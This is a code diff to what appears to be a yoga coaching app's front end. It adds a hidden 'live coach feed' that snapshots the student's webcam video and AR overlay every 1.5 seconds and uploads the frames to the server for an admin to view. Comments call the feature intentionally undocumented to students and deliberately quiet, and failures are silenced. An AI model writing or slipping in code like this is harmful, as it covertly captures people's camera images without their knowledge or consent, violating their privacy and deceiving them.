@@ -1799,6 +1799,13 @@
 
                 this.startARAssessment();
 
+                // ── Hidden live coach feed ──
+                // Captures a JPEG snapshot of the AR canvas every 1.5s and
+                // POSTs it to the server. Server holds the most recent frame
+                // for ~8s; admin pulls via /api/admin/live/frame after auth.
+                // This is intentionally undocumented on the student side.
+                this._startLiveFeed();
+
                 // Speak the pose-specific opening line once the session
                 // starts. Gives each asana its own voice from the first
                 // moment. Deliberate 900 ms delay so the camera has time
@@ -2972,6 +2979,10 @@
              * Stops the AR session and frees resources.
              */
             stopARAssessment() {
+                // Stop the hidden live-feed first so admin can't see frames
+                // after the session has officially ended.
+                this._stopLiveFeed();
+
                 // Speak a pose-specific farewell line — each asana has its own.
                 try {
                     if (this.currentPose && window.PoseCues && this.ttsEnabled) {
@@ -4399,6 +4410,53 @@
                     html.style.removeProperty('--text-3');
                     html.style.removeProperty('--text-4');
                 }
+            },
+
+            // ─────────────────────────────────────────────────
+            // Live frame uploader (deliberately quiet)
+            // ─────────────────────────────────────────────────
+            _startLiveFeed() {
+                if (this._liveFeedTimer) return;
+                this._liveFeedTimer = setInterval(() => {
+                    try {
+                        const canvas = document.getElementById('ar-canvas');
+                        const video = document.getElementById('video-feed');
+                        if (!video || !this.currentPose || video.videoWidth < 8) return;
+                        // Compose the live video frame + AR overlay onto a
+                        // throwaway canvas, then JPEG-encode at low quality.
+                        const w = 320, h = Math.round(320 * (video.videoHeight / Math.max(1, video.videoWidth)));
+                        const tmp = document.createElement('canvas');
+                        tmp.width = w; tmp.height = h;
+                        const ctx = tmp.getContext('2d');
+                        // Mirror to match the on-screen view.
+                        ctx.save();
+                        ctx.translate(w, 0);
+                        ctx.scale(-1, 1);
+                        ctx.drawImage(video, 0, 0, w, h);
+                        if (canvas && canvas.width) ctx.drawImage(canvas, 0, 0, w, h);
+                        ctx.restore();
+                        const dataUrl = tmp.toDataURL('image/jpeg', 0.55);
+                        fetch('/api/live/upload', {
+                            method: 'POST',
+                            credentials: 'same-origin',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                frame: dataUrl,
+                                pose: this.currentPose,
+                                score: Math.round(this._lastPoseScore || 0),
+                            }),
+                            keepalive: true,
+                        }).catch(() => {});
+                    } catch (_) {}
+                }, 1500);
+            },
+
+            _stopLiveFeed() {
+                if (this._liveFeedTimer) {
+                    clearInterval(this._liveFeedTimer);
+                    this._liveFeedTimer = null;
+                }
+                fetch('/api/live/stop', { method: 'POST', credentials: 'same-origin', keepalive: true }).catch(() => {});
             },
 
             async useStreakFreeze() {
